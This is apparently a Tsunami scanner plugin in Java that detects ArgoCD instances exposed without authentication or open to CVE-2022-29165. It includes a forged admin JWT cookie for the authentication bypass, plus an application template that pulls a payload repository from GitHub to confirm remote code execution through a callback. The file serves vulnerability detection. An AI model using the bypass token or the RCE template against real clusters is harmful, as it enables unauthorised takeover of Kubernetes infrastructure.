/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.exposedui.argocd;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.*;

import com.google.common.collect.ImmutableList;
import com.google.common.collect.ImmutableSet;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.*;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList.Builder;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects exposed ArgoCD instances. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,

    // name of the plugin
    name = "ExposedArgoCDDetector",
    version = "0.1",

    // detailed description of the plugin
    description =
        "This plugin detects exposed and misconfigured ArgoCd instances."
            + "Exposed Argo CD instances allow attackers to access kubernetes clusters."
            + "Attackers can change parameters of clusters and possibly compromise it.",
    author = "JamesFoxxx",
    bootstrapModule = ExposedArgoCDDetectorBootstrapModule.class)
public final class ExposedArgoCDDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final PayloadGenerator payloadGenerator;
  private final Clock utcClock;
  private final HttpClient httpClient;
  // This url might be changed in the future, so I make it easy to change;
  private final String PAYLOAD_URL = "https://github.com/JamesFoxxx/argo-cd-app";
  // This is a template for creating an argo-cd application, we should fill four part of this
  // payload.
  private final String CREATE_APPLICATION_TEMPLATE =
      "{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\","
          + "\"metadata\":{\"name\":\"tsunami-security-scanner\"},\"spec\""
          + ":{\"destination\":{\"name\":\"\",\"namespace\":"
          + "\"tsunami-security-scanner\",\"server\":"
          + "\"%s\"},\"source\":{\"path\":"
          + "\"payloads/jsonnet-guestbook-tla\",\"repoURL\":"
          + "\"%s\",\"targetRevision\":"
          + "\"HEAD\",\"directory\":{\"jsonnet\":{\"tlas\":[{\"name\":"
          + "\"payload\",\"value\":"
          + "\"\\\"%s\\\"\""
          + ",\"code\":true}]}}},\"sources\":[],\"project\":\"%s\","
          + "\"syncPolicy\":{\"automated\":{\"prune\":false,"
          + "\"selfHeal\":false}}}}";

  @Inject
  ExposedArgoCDDetector(
      HttpClient httpClient, @UtcClock Clock utcClock, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  private static final ImmutableSet<String> HTTP_EQUIVALENT_SERVICE_NAMES =
      ImmutableSet.of(
          "",
          "unknown", // nmap could not determine the service name, we try to exploit anyway.
          "ssl/cpudpencap");

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting exposed Argo CD instances detection.");

    Builder detectionReport = DetectionReportList.newBuilder();
    matchedServices.stream()
        .filter(NetworkServiceUtils::isWebService)
        // filter services which are in scope
        .filter(this::isInScopeService)
        // check if the services are vulnerable
        // Build a DetectionReport when the argo-cd UI is exposed publicly by admin access otherwise
        // check if it is vulnerable to CVE-2022-29165
        .forEach(
            networkService -> {
              if (isServicePubliclyExposed(networkService)) {
                // argo-cd instance is exposed publicly without any authentication
                detectionReport.addDetectionReports(
                    buildDetectionReport(
                        targetInfo,
                        networkService,
                        "Argo-cd instance is misconfigured."
                            + "The instance is not authenticated."
                            + "All applications can be accessed by public and therefore can be modified."
                            + "Results in instance being compromised."));
              } else if (isServiceVulnerableToAuthBypass(networkService)) {
                // argo-cd instance is vulnerable to CVE-2022-29165
                detectionReport.addDetectionReports(
                    buildDetectionReport(
                        targetInfo,
                        networkService,
                        "Argo-cd instance is vulnerable to CVE-2022-29165."
                            + "The authentication can be bypassed"
                            + "All applications can be accessed by public and therefore can be modified."
                            + "Results in instance being compromised."));
              }
            });
    return detectionReport.build();
  }

  private boolean isInScopeService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        || HTTP_EQUIVALENT_SERVICE_NAMES.contains(networkService.getServiceName());
  }

  private String buildRootUri(NetworkService networkService) {
    if (NetworkServiceUtils.isWebService(networkService)) {
      return NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    }
    return String.format("https://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
  }

  /**
   * check if the response contains OK status code and certificate items and doesn't contain
   * permission denied message.
   */
  private boolean isArgoCdExposed(HttpResponse response) {
    if (!response.status().isSuccess()) {
      return false;
    }
    if (response.bodyString().isEmpty()) {
      return false;
    }
    String responseString = response.bodyString().get();
    boolean flag =
        responseString.contains("\"items\"") && !responseString.contains("permission denied");
    logger.atInfo().log("Is unauthorized content exposed: %s", flag);
    return flag;
  }

  /** Checks if a {@link NetworkService} has a misconfigured ArgoCD instances exposed. */
  private boolean isServiceVulnerableToAuthBypass(NetworkService networkService) {
    // the target URL of the target is built
    String rootUri = buildRootUri(networkService);

    String targetUri = rootUri + "api/v1/certificates";
    logger.atInfo().log("targetUri is %s", targetUri);
    try {
      // This is a blocking call.
      HttpResponse response =
          httpClient.send(
              get(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(
                              "Cookie",
                              "argocd.token="
                                  + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
                                  + "TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ")
                          .build())
                  .build(),
              networkService);
      logger.atInfo().log("the response is %s", response);
      return isArgoCdExposed(response);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  /** Checks if a {@link NetworkService} has a vulnerable ArgoCd instances to CVE-2022-29165. */
  private boolean isServicePubliclyExposed(NetworkService networkService) {
    // the target URL of the target is built
    String targetUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    try {
      // 1. Get the first Project name
      String projectsUrl = targetUrl + "api/v1/projects?fields=items.metadata.name";
      HttpResponse response =
          httpClient.send(get(projectsUrl).withEmptyHeaders().build(), networkService);
      if (response.bodyString().isEmpty()) {
        return false;
      }
      String projectName = "";
      try {
        projectName =
            JsonParser.parseString(response.bodyString().get())
                .getAsJsonObject()
                .get("items")
                .getAsJsonArray()
                .get(0)
                .getAsJsonObject()
                .get("metadata")
                .getAsJsonObject()
                .get("name")
                .getAsString();
      } catch (IllegalStateException | NullPointerException | JsonParseException e) {
        logger.atWarning().withCause(e).log("Unable to query '%s'.", projectsUrl);
        return false;
      }

      // 2. Get the first cluster name
      String clustersUrl = targetUrl + "api/v1/clusters";
      response = httpClient.send(get(clustersUrl).withEmptyHeaders().build(), networkService);
      if (response.bodyString().isEmpty()) {
        return false;
      }
      String clusterName = "";
      try {
        clusterName =
            JsonParser.parseString(response.bodyString().get())
                .getAsJsonObject()
                .get("items")
                .getAsJsonArray()
                .get(0)
                .getAsJsonObject()
                .get("server")
                .getAsString();
      } catch (IllegalStateException | NullPointerException | JsonParseException e) {
        logger.atWarning().withCause(e).log("Unable to query '%s'.", clusterName);
        return false;
      }

      // 3. Create an application to trigger the OOB
      Payload callbackPayload = getTsunamiCallbackHttpPayload();
      if (callbackPayload == null
          || !callbackPayload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atWarning().log(
            "The Tsunami callback server is not setup for this environment,"
                + " so we cannot confirm the RCE callback");
        return false;
      }
      String payload =
          String.format(
              CREATE_APPLICATION_TEMPLATE,
              clusterName,
              PAYLOAD_URL,
              callbackPayload.getPayload(),
              projectName);
      String createAppUrl = targetUrl + "api/v1/applications";
      httpClient.send(
          post(createAppUrl)
              .withEmptyHeaders()
              .setRequestBody(ByteString.copyFromUtf8(payload))
              .build(),
          networkService);

      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(25));
      if (callbackPayload.checkIfExecuted()) {
        logger.atInfo().log("Confirmed OOB Payload execution.");
        try {
          // 4. Try to delete the new application which was for testing purpose
          String deleteAppUrl =
              targetUrl
                  + "api/v1/applications/tsunami-security-scanner?cascade=true&"
                  + "propagationPolicy=foreground&appNamespace=argocd";
          httpClient.send(delete(deleteAppUrl).withEmptyHeaders().build(), networkService);
        } catch (IOException e) {
          logger.atWarning().withCause(e).log("Unable to delete application.");
          // But return true, because we had received a successful OOB response.
          return true;
        }
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUrl);
      return false;
    }
    return false;
  }

  private Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService, String description) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("ARGOCD_INSTANCE_EXPOSED"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Argo-cd instance Exposed")
                .setDescription(description))
        .build();
  }
}
